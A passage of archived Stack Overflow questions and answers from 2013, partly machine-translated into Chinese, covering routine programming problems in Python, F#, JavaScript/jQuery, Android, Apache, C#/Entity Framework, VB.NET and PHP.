这意味着当将这 200K 对象添加到集合时 - 它们开始占用大量内存。该对象是来自 TMDB 的简单电影数据 - ID、流派列表、演员列表、导演列表、许多其他电影详细信息以及可能来自 Wikipedia 的大型电影描述。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:59:33.317

最好的方法可能是使您存储在集合中的对象更小。如果它们包含不必要的字段，请将它们删除。

为了减少一般对象开销，您还可以使用[`__slots__`](http://docs.python.org/2/reference/datamodel.html#slots)声明使用的字段：

```
class Person(object):
   __slots__ = ['name', 'age']
   def __init__(self):
      self.name = 'jack'
      self.age = 99 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-03-23T10:58:45.320

集合确实使用大量内存，但列表不会。

```
>>> from sys import getsizeof
>>> a = range(100)
>>> b = set(a)
>>> getsizeof(a)
872
>>> getsizeof(b)
8424
>>> 
```

如果您使用集合的唯一原因是为了防止重复，我建议您改用列表。您可以通过在添加对象之前测试对象是否已在列表中来防止重复。它可能比使用内置的集合机制要慢，但它肯定会使用更少的内存。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-21T18:59:22.653

尝试使用[`__slots__`](http://docs.python.org/release/2.5.2/ref/slots.html)以减少内存使用量。

当我上次遇到大量对象的问题时，使用`__slots__`将内存使用量减少到 1/3。

这是一个[关于`__slots__`](https://stackoverflow.com/questions/472000/python-slots)您可能会感兴趣的问题。

# f# - Tryfsharp.org - type providers?

> ID：15555730
> 
> 赞同：8
> 
> 时间：2013-03-21T18:48:23.473
> 
> 标签：f#, type-providers

Does anyone know what type providers are available on tryfsharp.org?

For example, I know that a CsvFile type provider is available by referencing:

```
#r "Samples.Csv.dll" 
```

Additionally, there are:

```
#r "Samples.Hadoop.TypeProviders.dll"
#r "Samples.DataStore.Freebase.dll" 
```

But what others can be used? It would be cool if an XML or JSON type provider were available. I can't seem to find any documentation on what dll's can be referenced in a script on tryfsharp.org.

Anyone have additional information on the matter?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-21T19:15:18.820

您注意到的都是 TryFSharp.org 的“学习”部分的一部分。我发现发现这些的最好方法是浏览教程。

[Hadoop](http://www.tryfsharp.org/Learn/data-science#hadoop)

`#r "Samples.Hadoop.TypeProviders.dll"`

[游离碱](http://www.tryfsharp.org/Learn/data-science#data-analysis)

`#r "Samples.DataStore.Freebase.dll"`

[CSV](http://www.tryfsharp.org/Learn/data-science#unlock-thousands)

`#r "Samples.Csv.dll"`

[天蓝色](http://www.tryfsharp.org/Learn/data-science#azure-weather)

```
#r "System.Data.Services.Client"
#r "Samples.WindowsAzure.Marketplace" 
```

[世界银行](http://www.tryfsharp.org/Learn/data-science#world-bank-health)

`#r "Samples.WorldBank.dll"`

[Excel.WorksheetTable](http://www.tryfsharp.org/Learn/financial-computing#understanding-systemic-risk)

`#r "Samples.Excel.WorksheetTable.dll"`

几个非类型提供者（我可能错过了一些）：

[MathNet.数值](http://www.tryfsharp.org/Learn/financial-computing#analyzing-stock-markets)

`#r "MathNet.Numerics.dll"`

[MathNet.Numerics.Fsharp](http://www.tryfsharp.org/Learn/financial-computing#analyzing-stock-markets)

`#r "MathNet.Numerics.FSharp.dll"`

[TryFSharp.org 的浏览器 API](http://www.tryfsharp.org/Learn/data-visualization#extending-tryfsharp)

```
open TryFSharp
Canvas.Show()
Canvas.Clear()

Canvas.SetContent "<h1>Try F# interop</h1>Try F# interop rocks!"

Canvas.RunJavaScript "document.getElementsByTagName('h1')[0].innerHTML = 'New title!'"

let raphaelUndefined = Canvas.RunJavaScript "(typeof dojo === 'undefined')"
if raphaelUndefined :?> bool then
    Canvas.LoadScript "http://cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js" 
```

（对于这个请注意`Canvas.LoadScript`它允许您加载 javascript）

不是需要加载的文件，但还有：

[Samples.Charting.DojoChart](http://www.tryfsharp.org/Learn/data-visualization#quick-start)

`open Samples.Charting.DojoChart`

# stored-procedures - Convert DateTime2 to DateTime from Stored Procedure Executed Result

> ID：15555732
> 
> 赞同：0
> 
> 时间：2013-03-21T18:48:26.627
> 
> 标签：stored-procedures, crystal-reports, datetime2

How can i Convert DateTime2 to DateTime from Stored Procedure Executed Result ? I have a procedure which will execute a dynamically formed sql statement which will have an output of various columns in which there are some datetime2 data types. How can I change that datetime2 to datetime because I haev to assign this procedure as data source to a crystal report but crystal report converts datetime2 to string and string can't do required logic in report. So I want the procedure to give datetime rather than datetime2.

I guess temp tables might help me but not sure how to proceed.. please help..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T21:35:09.033

假设 DateTime2 字段字符串看起来像它在 MS SQL/ISO 8601（请参阅[datetime2 (Transact-SQL)](http://msdn.microsoft.com/en-us/library/bb677335.aspx "日期时间2 (Transact-SQL)")）：“2007-05-02T19:58:47.1234567”，您可以提取字符串的所需部分，然后使用`CDate`或`CDateTime`将它们转换为日期或日期时间。

```
If IsDate(left({Results.DT2Field}, 10))
    Then
    CDate(left({Results.DT2Field}, 10)); 
```

或日期时间

```
If IsDateTime(left({Results.DT2Field}, 10) + " " + mid({Results.DT2Field},12,8))
    Then
    CDateTime(left({Results.DT2Field}, 10) + " " + mid({Results.DT2Field},12,8)); 
```

以上结果是您的转换值。

# javascript - Should I put a semicolon in the href of a Javascript-only link?

> ID：15555738
> 
> 赞同：6
> 
> 时间：2013-03-21T18:48:39.373
> 
> 标签：javascript, html

Are there any advantages/disadvantages of

```
<a href="javascript:;" onclick="myFunc()">do myFunc</a> 
```

over

```
<a href="javascript:" onclick="myFunc()">do myFunc</a> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:55:28.147

```
 <a href="javascript:;" onclick="myFunc()">do myFunc</a>- 

      Will kill script execution

  <a href="javascript:" onclick="myFunc()">do myFunc</a>
       Execute Script 
```

例如：http: [//jsfiddle.net/JZje5/](http://jsfiddle.net/JZje5/)

# jquery - fancyBox 无法正常显示

> ID：15555740
> 
> 赞同：0
> 
> 时间：2013-03-21T18:48:47.037
> 
> 标签：jquery, fancybox, colorbox, anythingslider

我试图在下面列出的页面中实现 fancyBox，但是，在单击时没有生成灯箱。

我在下面的示例中正确调用并生成了 fancyBox，但是单击锚元素时它似乎没有启动。

[http://jsfiddle.net/jodriscoll/Xf7qf/](http://jsfiddle.net/jodriscoll/Xf7qf/)

```
jQuery(document).ready(function() {
    jQuery(".fancyBox").fancybox({
        maxWidth    : 800,
        maxHeight   : 600,
        fitToView   : false,
        width       : '70%',
        height      : '70%',
        autoSize    : false,
        closeClick  : false,
        openEffect  : 'none',
        closeEffect : 'none'
    });
}); 
```

正如你所看到的，我称之为fancyBox 的精简版本，并且所有正确的CSS 样式/类关联都已正确构建。

如果我错过了什么，请告诉我在哪里然后礼貌地称我为白痴:)

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-18T06:27:52.493

打开文件'jquery.fancybox-1.3.4.pack.js'并将单词“body”替换为“form”。那里有两个字“身体”。感谢 tuyenbui。

这个页面也解决了这个问题：[Fancybox - ASP.NET button not working](https://stackoverflow.com/questions/2686362/fancybox-asp-net-button-not-working/4067885)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T23:33:13.197

它可能在 IE8 中不起作用，因为在 thumbs 数组的末尾有一个逗号。IE8+ 是严格的，不喜欢尾随逗号。

# javascript - Reorder the options in a select box with javascript

> ID：15555741
> 
> 赞同：3
> 
> 时间：2013-03-21T18:48:52.767
> 
> 标签：javascript, jquery, html, forms

I have a select box that dynamically shows a list of shipping options and prices. I want them to be in order from lowest to highest price.

Here's example html.

```
<select name="ShippingMethod">
  <option value="ups:1">UPS Next Day Air ($30.08)</option>
  <option value="ups:4">UPS 2nd Day Air ($14.77)</option>
  <option value="ups:6">UPS 3 Day Select ($10.93)</option>
  <option value="ups:7">UPS Ground ($8.00)</option>
  <option value="flatzonc:Pick up in store">Pick up in store ($0.00)</option>
  <option value="mvusps:PRIORITY">U.S.P.S. Priority Mail&reg; ($7.45)</option>
</select> 
```

I know how to put the values into an array with this:

```
shippingOptions = [];
$('select[name=ShippingMethod] option').each(function() {
    myList.push($(this).html())
}); 
```

but thats as far as I got. I don't know how to use that to sort them and reinsert them in order. I'm new to javascript so I appriciate the help.

Thanks

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:07:04.560

[http://jsfiddle.net/hPZ3F/17](http://jsfiddle.net/hPZ3F/17)

```
// get all options
var shippingOptions = $('select[name=ShippingMethod] option');

// initialize sort
shippingOptions.sort(function(a,b) {
    // define regex that pulls contents of parens
    var patt = /\((.*)\)/;

    // for each element in sort, find the price and remove the dollar sign
    a.price = a.text.match(patt)[1].replace('\$', '');
    b.price = b.text.match(patt)[1].replace('\$', '');

    return a.price - b.price;
});

// update the select with the new option order
$('select[name=ShippingMethod]').append(shippingOptions);

// select the first option
$(shippingOptions[0]).attr("selected", ""); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T19:25:28.343

首先，您需要提取每个选项的 $ 金额，然后对它们进行排序并替换现有的下拉列表，这是完整的代码：

[http://jsfiddle.net/amyamy86/L8qgX/](http://jsfiddle.net/amyamy86/L8qgX/)

```
// Get the price in the option
    var getPrice = function (str) {
        var price = 0;
        var result = str.match(/[0-9]+(.)[0-9]{2}/);    //regex matches >1 digit followed by . decimal, followed by 2 digits
        if (result.length > 0) {
            price = parseFloat(result[0]);
        }
        return price;
    };

// Sort the prices
    var sortPrices = function (priceList) {
        priceList.sort(function (a, b) {
            return a.price > b.price; // > is sort ascending order
        });
        return priceList;
    };

var prices = [];
// Get the option's label, value, price
    $('select[name=ShippingMethod] option').each(function () {
        var option = $(this);
        var price = getPrice(option.text());
        prices.push({
            label: option.html(),
            value: option.val(),
            price: price
        });
    });

var shippingOptions = sortPrices(prices);

// create output HTML
var output = '';
for (var i = 0; i < shippingOptions.length; i++) {
    output += '<option value="' + shippingOptions[i].value + '">' + shippingOptions[i].label + '</option>';
}

// replace <select> with sorted options
$('select[name="ShippingMethod"]').html(output); 
```

您可以了解有关使用的更多信息：

*   `match()`使用正则表达式：[https ://developer.mozilla.org/en-US/docs/JavaScript/Guide/Regular_Expressions](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Regular_Expressions)
*   `sort()`：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T19:36:16.903

嗯，已经回答了，但我已经写了这个，所以无论如何我都会发布，这几乎是所有其他内容的混合，哈哈..

```
$('select[name=ShippingMethod]').
    html($('select[name=ShippingMethod] option').
         clone().sort(function (a, b) {
            a = a.innerHTML, b = b.innerHTML;
            return parseFloat(
                    a.substr(a.indexOf('$') + 1)
                ) >= parseFloat(
                    b.substr(b.indexOf('$') + 1)
                );
        })
    ); 
```

[http://jsfiddle.net/6zbzK/](http://jsfiddle.net/6zbzK/)

编辑：查看评论后，这是一个更有效但更详细的答案：

```
var selectOpts = $('select[name="ShippingMethod"] option');
var len = selectOpts.length;
var options = new Array(len), out = "", i;
selectOpts.each(function (index) {
    var self = $(this);
    var txt = self.text();
    options.push({
        'html': '<option value="' + self.val() + '">' + txt + '</option>',
        'price': parseFloat(txt.substr(txt.indexOf('$') + 1))
    });
    // Return if not last item
    if (index !== len - 1) {
        return;
    }
    // Sort options and set 'out'
    options.sort(function (a, b) {
        return a.price > b.price;
    });
    for (i = 0; i < len; i += 1) {
        out += options[i].html;
    };
}).parent('select').html(out); 
```

[http://jsfiddle.net/QnHFH/](http://jsfiddle.net/QnHFH/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T18:50:05.563

Try this.. Here Sorting is done on value.. You can use `.text` to sort based on text

```
$("select").html($("select option").sort(function (a, b) {
     return a.text == b.text ? 0 : a.value < b.value ? -1 : 1  ;
})); 
```

[Demo](http://jsfiddle.net/zHqxj/)

Sort on text: [Demo 2](http://jsfiddle.net/zHqxj/3/)

```
 return a.text == b.text ? 0 : a.text < b.text ? -1 : 1 ; 
```

Sort on values indside braces in text : **[Demo 3](http://jsfiddle.net/zHqxj/5/)**

```
$("select").html($("select option").sort(function (a, b) {
    var a1 =  parseFloat(a.text.match(/\(.*?([\d.]+).*?\)/)[1].replace("$",""));
    var b1 =  parseFloat(b.text.match(/\(.*?([\d.]+).*?\)/)[1].replace("$",""));
    return a.text == b.text ? 0 : a1 < b1 ? -1 : 1
})); 
```

# javascript - Unable to work out innerHTML setup

> ID：15555744
> 
> 赞同：0
> 
> 时间：2013-03-21T18:48:56.843
> 
> 标签：javascript, html

I am a bit new to Javascript, but I am trying to setup a very simple user input/response system. For some reason, I have run into this before where innerHTML was not displaying information given to it. Here is the basic setup of what I am trying to do:

```
<!DOCTYPE html>
<html>
<head>
    <title>titles are lame</title>
    <link/>
    <link rel="stylesheet" type="text/css" href="stylesheet.css">
    <script type="text/javascript" src="script.js"></script>
    <script></script>
</head>
<body>
<div id="wrapper"><div id="text">Test</div>
<br>
<input type='text' id="input"><input type="submit"id="submit" onclick="act()">
<input type="button" value="Button" onclick="act()">

</div>
</body>
</html> 
```

That was the HTML just in case I was missing something simple. Here is the Javascript.

```
var state = 0;
var inputf = getElementById("input");
var text = getElementById('text');
var input, name, age;

function act(){
input = inputf.content;
switch(state){
    case 0:
        text.innerHTML = "This is supposed to overwrite Test text.";
        break;
    case 1:
        break;
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:00:02.807

您在脚本的全局范围内调用doing `var text = getElementById('text');`，这意味着它会在脚本加载后立即发生，可能在页面的其余部分加载之前。因此，您尝试获取的元素可能还不存在。

尝试将这些变量的初始化移动到`act()`.

# android - Android Intent.getStringExtra() 返回 null

> ID：15555750
> 
> 赞同：48
> 
> 时间：2013-03-21T18:49:24.617
> 
> 标签：android, string, android-intent, null, extras

这就是将字符串添加到 Extras 的方式：

```
Intent i = new Intent();
i.putExtra("Name", edt_name.getText());
i.putExtra("Description", edt_desc.getText());
i.putExtra("Priority", skb_prior.getProgress());
setResult(RESULT_OK, i);
finish(); 
```

这就是我尝试提取它们的方式`onActivityResult()`：

```
String name = data.getStringExtra("Name");
String desc = data.getStringExtra("Description");
int prior   = data.getIntExtra("Priority", 50); 
```

但是在第二个代码块之后`name`，`desc`是`null`的，虽然`prior`有它的正确值。此外，在调试器中我可以看到，它`data.mExtras.mMap`包含所需的字符串，但只有在第一次请求它之后。

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2013-03-21T18:54:09.337

当您插入`Extras`尝试添加时`.toString()`

```
i.putExtra("Name", edt_name.getText().toString()); 
```

您`CharSequence`在那里看到了价值，但您需要将其转换为 a `String`to call `getStringExtra()`。显然，只需为`Strings`. 您会看到正确的值，`int`因为这样做是正确的

# apache - 使用 mod_rewrite 为 http 上的所有请求返回 404

> ID：15555751
> 
> 赞同：1
> 
> 时间：2013-03-21T18:49:26.267
> 
> 标签：apache, mod-rewrite, rewrite, http-status-code-404

我正在配置 apache 以创建一个站点，该站点将使用 mod_jk 连接到在 tomcat 上运行的应用程序。

我只希望 https 请求访问我的应用程序，我想使用 mod_rewrite 为端口 80 上的任何 http 请求返回 404。

这是我对 VirtualHost 配置的尝试

```
<VirtualHost *:80>
  ServerName admin.app.com
  RewriteEngine On
  RewriteRule ^ [L,R=404]
</VirtualHost>

<VirtualHost *:443>
  ServerName admin.app.com
  SSLEngine On
  SSLCertificateFile /etc/apache2/ssl/bla.crt
  SSLCertificateKeyFile /etc/apache2/ssl/bla.key
  SSLCACertificateFile /etc/apache2/ssl/bla.ca
  SSLProtocol all
  SSLCipherSuite HIGHT:MEDIUM

  JkMount /myapp* 

</VirtualHost> 
```

[现在点击https://admin.app.com/myapp](https://admin.app.com/myapp)时一切都很好- 我可以访问我的 tomcat 应用程序，确认 mod_jk 和我的 SSL 证书按预期工作，但是我使用 http 发出的任何 url 请求： // 返回 400 错误请求，而不是我期望的 404。

我添加了 RewriteLog 和 RewriteLogLevel 3 并得到以下输出

```
(2) init rewrite engine with requested uri /
(3) applying pattern '^' to uri '/'
(2) rewrite '/' -> '[L,R=404]'
(2) local path result: [L,R=404]
(2) init rewrite engine with requested uri /myapp/favicon.ico/
(3) applying pattern '^' to uri '/myapp/favicon.ico/'
(2) rewrite '/myapp/favicon.ico/' -> '[L,R=404]'
(2) local path result: [L,R=404] 
```

我解释为应该返回 404

我的问题是，当日志似乎将我的请求正确地重写为 404 时，为什么我会收到 400 Bad Request，此外，关于只允许通过 https 访问网站的最佳做法是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T19:29:22.183

您不应该使用代码 404，因为问题不在于找不到页面，而在于用户正在发出禁止请求。

相反，试试这个：

```
RewriteRule ^ - [F] 
```

然后您可以使用自定义的 403 错误页面来说明该路径只允许安全请求。

# wpf - VB.Net：wpf 窗口的集合

> ID：15555754
> 
> 赞同：0
> 
> 时间：2013-03-21T18:49:34.927
> 
> 标签：wpf, vb.net, wpf-controls

我对 VB.Net 很陌生。

我正在编写一个类似于调查的程序。WPF 窗口按顺序依次弹出问题。现在，我的客户要求随机化一些窗口的顺序。我想我可能有一个窗口集合，并以随机顺序依次呈现这些窗口。但是，我没有找到任何有关它的信息。

有人可以向我展示如何将不同的窗口存储在某种集合中，然后按顺序显示它们吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:47:24.983

你应该能够使用这样的东西：（*未测试）*

```
Dim l_windows As New List(Of Window)

' However you want to go about populating your list of windows...
l_windows.Add( new Window1() )
l_windows.Add( new Window2() )

Dim l_random As New Random()
Dim l_randomWindows = From w In l_windows
                      Select Ordinal = l_random.Next(),
                             Window = w
                      Order By Ordinal
                      Select Window

For Each l_window in l_randomWindows
    l_window.Show()
Next 
```

请注意，标准的 .NET 随机数发生器只是伪随机数，如果出于统计目的等需要随机性，这是一个糟糕的选择。（不过，找到更好的随机数发生器并不难。）

LINQ 查询说明：

*   遍历 l_windows，将集合中的每个项目分配给`w`

    ```
    From w In l_windows 
    ```

*   对于每个`w`，创建一个具有两个属性的新匿名对象：将随机数分配给`Ordinal`和 分配`w`给`Window`。（编译器将在后台创建一个描述这种匿名类型的类，但您永远不需要直接处理它。）

    ```
    Select Ordinal = l_random.Next(),
           Window = w 
    ```

*   对匿名类型对象进行排序`Ordinal`。如果两个`Ordinal`s 相同，那么它只会一个接一个地放置（可能基于 l_window 的原始顺序，虽然我没有测试过）。

    ```
    Order By Ordinal 
    ```

*   对于新重新排序的列表中的每个匿名类型对象，选择分配给 Window 属性的对象。LINQ 足够聪明地选择值，而不是创建具有单个属性的匿名类型。

    ```
    Select Window 
    ```

*   然后`IEnumerable(Of Window)`将 分配给`l_randomWindows`。

> **请注意**，由 IEnumerable 表示的对象本身并不是一个集合。编译器实际上会创建一个查询对象，直到您实际尝试从集合中检索项目（如在`For`循环中），该对象才会执行。此查询将一次又一次地执行，每次返回不同的排序结果（因为`l_random.Next()`每次都会调用）。
> 
> 如果你想得到一个稳定的集合，只需调用`l_randomWindows.ToList()`or`l_randomWindows.ToArray()`并将结果分配给一个变量。

# c# - 在实体框架中比较具有多个条件的两个列表

> ID：15555765
> 
> 赞同：0
> 
> 时间：2013-03-21T18:50:27.853
> 
> 标签：c#, linq-to-entities, entity-framework-5

我正在尝试获取`User`谁是 a`FacebookFriend`以及当前用户尚未关注谁的列表（`UserFollower`）。这是我正在尝试使用的查询，但我仍在获取当前用户已经关注的用户。不知道下一步该怎么做。

```
 var fb = db.Members 
      .Include(i => i.User)
           .Where(x => db.FacebookFriends.Where(y => y.UserID == CurrentUserID)
                .Select(f => f.FacebookID)
                .Contains(x.ProviderUserId)
                && !db.UserFollowers
                .Select(f => f.FollowerID)
                .Contains(x.UserID)
            ).Take(6).ToList(); 
```

`FacebookID`是一样`ProviderUserId` `FollowerID`的`UserID`

这是模型。

```
public class FacebookFriend
{
    public int ID { get; set; }
    public int UserID { get; set; }
    public string FacebookID { set; get; }
    public string Name { set; get; }

    public User User { get; set; }
}

public class UserFollower
{
    public int ID { get; set; }
    public int UserID { get; set; }
    public int FollowerID { get; set; }
    [ForeignKey("UserID")]
    public User User { get; set; }
    [ForeignKey("FollowerID")]
    public User Follower { get; set; }
} 
```

`Member`桌子

```
[Table("webpages_OAuthMembership")]
public class OAuthMembership
{
    [Key, Column(Order = 0), StringLength(30)]
    public string Provider { get; set; }

    [Key, Column(Order = 1), StringLength(100)]
    public string ProviderUserId { get; set; }

    public int UserID { get; set; }

    //public User User { get; set; }
    [Column("UserID"), InverseProperty("OAuthMemberships")]
    public User User { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:48:36.317

看起来您的代码*应该可以*工作，但也许为了清楚起见，可以使用查询语法对其进行重组：

```
var fb =
    (from m in db.Members
     let friendIds = 
         from ff db.FacebookFriends
         where ff.UserID == CurrentUserID
         select ff.FacebookId
     let followerIds = 
         from uf db.UserFollowers
         select uf.FollowerID
     where friendIds.Contains(m.ProviderUserId) && !followerIds.Contains(m.UserID)
     select m)
    .Take(6)
    .ToList(); 
```

# c# - .net Reflector decompiled C# code won't compile

> ID：15555766
> 
> 赞同：1
> 
> 时间：2013-03-21T18:50:28.280
> 
> 标签：c#, .net, reflector

I tried to decompile a C# console application and compile it again in Visual C# 2010, but there are many errors in the code. Here is an example:

```
 public static Test mTest
    {
        [CompilerGenerated]
        get
        {
            return <mTest>k__BackingField;
        }
        [CompilerGenerated]
        set
        {
            <mTest>k__BackingField = value;
        }
    } 
```

I've set the .net framework version to 3.5 in .net Reflector. Is there any way to get code that is able to recompile from .net Reflector?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T18:55:35.640

没有直接的方法可以克服这个限制。从您的源代码创建的编译器`IL`，这`IL`可能**不**包含有关您的初始源代码的信息。例如当你写

```
public string Property { get; set; } 
```

编译器创建支持字段（例如`<Property >k__BackingField`）并使用特殊符号对其进行命名，您不能在源代码中使用这些符号来命名您的字段。您给出了上面的示例，其中反射器试图推断编译器的含义。

我使用[了 dotPeek](http://www.jetbrains.com/decompiler/)（JetBrains 的免费反编译器），它理解自动属性，因此您会在示例中看到正确的代码。但同样 - 可能存在 dotPeek 无法获取初始源代码的情况。

# php - 列出显示 index.php 的文件夹中的文件

> ID：15555771
> 
> 赞同：3
> 
> 时间：2013-03-21T18:50:51.293
> 
> 标签：php, dir

我有这段代码，但它显示 index.php 本身 如何过滤 *.php 文件？

```
<?php
    if ($handle = opendir('.')) {
    while (false !== ($file = readdir($handle)))
    {
        if ($file != "." && $file != "..")
        {
            $thelist .= '<LI><a href="'.$file.'">'.$file.'</a>';
        }
    }
    closedir($handle);
    }
?>

<P>Dir:</p>
<UL>
<P><?=$thelist?></p>
</UL> 
```

还有一种方法可以按修改或创建时间对它们进行排序吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:55:21.627

只需将另一个排除项添加到您忽略“。”的部分。和 '..' 例如：

```
if ($file != "." && $file != ".." && !preg_match('/\.php$/i', $file)) 
```

这将排除任何最后带有 .php 的文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T20:52:48.677

这是另一个使用**ksort**或**krsort**函数（已测试）。
（参见代码中的注释。）

```
<?php
// you can add to the array
$ext_array = array(".htm", ".php", ".asp", ".js"); //list of extensions not required
$dir1 = "."; 
$filecount1 = 0; 
$d1 = dir($dir1);

while ($f1 = $d1->read()) { 
$fext = substr($f1,strrpos($f1,".")); //gets the file extension
if (in_array($fext, $ext_array)) { //check for file extension in list
continue;
}else{
if(($f1!= '.') && ($f1!= '..')) { 
if(!is_dir($f1)) $filecount1++;

$key = filemtime($f1);
$files[$key] = $f1 ;
} 
}
}

// use either ksort or krsort => (reverse order)
//ksort($files);
krsort($files);

foreach ($files as $f1) {
$thelist .= '<LI><a href="'.$f1.'">'.$f1.'</a>';
}

?>

<P>Dir:</p>
<UL>
<P><?=$thelist?></p>
</UL> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T18:57:39.553

```
<?php
    if ($handle = opendir('.')) {
    while (false !== ($file = readdir($handle)))
    {
        if ($file != "." && $file != ".." && substr(strrchr($file,'.'),1) != 'php')
        {
            $thelist .= '<LI><a href="'.$file.'">'.$file.'</a>';
        }
    }
    closedir($handle);
    }
?> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T19:14:55.713

（我构建的一些东西）
**这将向您显示带有扩展名的文件名以及文件计数（已测试）**

```
<?php
// you can add to the array
$ext_array = array(".htm", ".php", ".asp", ".js");
//list of extensions not required (above)
$dir1 = "."; 
$filecount1 = 0; 
$d1 = dir($dir1); 

while ($f1 = $d1->read()) { 
$fext = substr($f1,strrpos($f1,".")); //gets the file extension
if (in_array($fext, $ext_array)) { //check for file extension in list
continue;
}else{
if(($f1!= '.') && ($f1!= '..')) { 
if(!is_dir($f1)) $filecount1++;

$thelist .= '<LI><a href="'.$f1.'">'.$f1.'</a>';

} 
}
}

// add text and count number below files
echo "Total files in folder: ";
echo "$filecount1";
?>

<P>Dir:</p>
<UL>
<P><?=$thelist?></p>
</UL> 
```

# javascript - 选中的 jQuery 复选框适用于所有输入

> ID：15555773
> 
> 赞同：-3
> 
> 时间：2013-03-21T18:51:02.270
> 
> 标签：javascript, jquery, forms, input

我有以下脚本

```
<script>

    $('input:checkbox').live('change', function() {
        if ($(this).is(':checked')) {
            alert('checked');
        } else {
            alert('un-checked');
        }
    });

</script> 
```

所以，问题是我有多个复选框，因此它会在每个复选框处发出警报。我只想在用户选择一个特定复选框时发出警报。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:54:00.647

您需要在复选框上定义一个 id 或一个类。您当前的代码正在查看每个输入：复选框。

改变这个：

```
$('input:checkbox').live('change', function(){ 
```

到

```
$('#idofcheckbox').live('change', function(){ 
```

然后将 id 添加到复选框中：

```
<input type=checkbox id="idofcheckbox"> 
```

# php - 使用 PHP 查询生成 KML/KMZ/XML

> ID：15555775
> 
> 赞同：1
> 
> 时间：2013-03-21T18:51:07.653
> 
> 标签：php, xml, google-maps, kml

我正在尝试使用 php 生成 KML，但在第 1 行出现错误屏幕，这是我的文档：

```
<?php
header('Content-type: text/xml');

include('../../../../../../config.php');

// Print the head of the document
echo htmlentities('<?xml version="1.0" encoding="UTF-8"?>');
echo '</br>';
echo htmlentities('<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:kml="http://www.opengis.net/kml/2.2" xmlns:atom="http://www.w3.org/2005/Atom">');
echo '</br>';
echo htmlentities('<Document>');
echo '</br>';

  // Finally query the database data
$result = mysql_query("SELECT * FROM acars_airports ORDER BY id DESC");

  // Now iterate over all placemarks (rows)
while ($row = mysql_fetch_array($result)) {

    // This writes out a placemark with some data
    // -- Modify for your case --

echo htmlentities('<Placemark>');
echo '</br>';
echo htmlentities('<name>'.$row['icao'].'</name>');
echo '</br>';
echo htmlentities('<description>'.$row['name'].'</description>');
echo '</br>';
echo htmlentities('<Point>');
echo '</br>';
echo htmlentities('<coordinates>'.$row['lon'].' , '.$row['lat'].'</coordinates>');
echo '</br>';
echo htmlentities('</Point>');
echo '</br>';
echo htmlentities('</Placemark>');
echo '</br>';

  };

// And finish the document

echo htmlentities('</Document>');
echo '</br>';
echo htmlentities('</kml>');

?> 
```

忘记查询！如何生成要在谷歌地图上读取的 KML/KMZ/XML 文件？

已经尝试过：

```
header('Content-type: text/xml');
header('Content-type: application/vnd.google-earth.kmz'); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-24T05:42:55.270

我创建了一个新代码，现在它可以工作了，把它放到你的 HTML 页面中：

```
</html>
<style type="text/css">
      html { height: 100% }
      body { height: 100%; margin: 0; padding: 0 }
      #map_canvas { height: 100% }
</style>

        <script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&sensor=false">
        </script>

        <script type="text/javascript">
              function initialize() {
                var mapOptions = {
                  center: new google.maps.LatLng(-15.869167, -47.920834),
                  zoom: 3,
                  disableDefaultUI: true,
                  mapTypeId: google.maps.MapTypeId.HYBRID
                };
                var map = new google.maps.Map(document.getElementById("map_canvas"),
                    mapOptions);

                var nyLayer = new google.maps.KmlLayer(
              'YOUR_REAL_KML_LINK',
              {  suppressInfoWindows: false,
                 map: map});

                google.maps.event.addListener(nYLayer,'click',function(){
                    infowindow.open(map, nYLayer); 
                });
        }

        </script> 
</head>

    <body onLoad="initialize()">
    <div id="map_canvas" style="width:800; height:400;"></div>
    </body>
</html> 
```

并使用您的查询通过 PHP 生成您的 KML：

```
<?php
header('Content-Type: application/vnd.google-earth.kml+xml kml');
header('Content-Disposition: attachment; filename="test.kml"');

include('database_config.php');

// Query the database data
$result = mysql_query("SELECT * FROM YOUR_DATA_TABLE");

// Print the head of the document
echo '<?xml version="1.0" encoding="UTF-8"?>';
echo '<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:kml="http://www.opengis.net/kml/2.2" xmlns:atom="http://www.w3.org/2005/Atom">';
echo '<Document>';

  // Now iterate over all placemarks (rows)
while ($row = mysql_fetch_array($result)) {

    // This writes out a placemark with some data

echo '<Placemark>';
echo '<name>'.$row['name'].'</name>';
echo '<description>'.$row['description'].'</description>';
echo '<Point>';
echo '<coordinates>'.$row['lng'].' , '.$row['lat'].'</coordinates>';
echo '</Point>';
echo '</Placemark>';

  };

// And finish the document

echo '</Document>';
echo '</kml>';

?> 
```

